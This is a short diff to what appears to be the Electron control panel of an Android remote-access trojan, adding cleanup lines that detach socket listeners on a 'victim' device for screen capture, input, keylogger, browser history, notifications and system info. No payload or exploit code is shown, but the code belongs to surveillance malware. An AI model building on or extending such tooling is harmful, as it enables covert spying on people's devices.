@@ -565,6 +565,12 @@ ipcMain.on('openLabWindow', function (e, page, index) {
       victim.socket.removeAllListeners("x0000ap"); // apps
       victim.socket.removeAllListeners("x0000cb"); // clipboard
       victim.socket.removeAllListeners("x0000wf"); // wifi
+      victim.socket.removeAllListeners("x0000sc"); // screen
+      victim.socket.removeAllListeners("x0000in"); // input
+      victim.socket.removeAllListeners("x0000kl"); // keylogger
+      victim.socket.removeAllListeners("x0000bh"); // browser history
+      victim.socket.removeAllListeners("x0000nt"); // notifications
+      victim.socket.removeAllListeners("x0000si"); // system info
       log.info('All socket listeners removed');
     }
   })
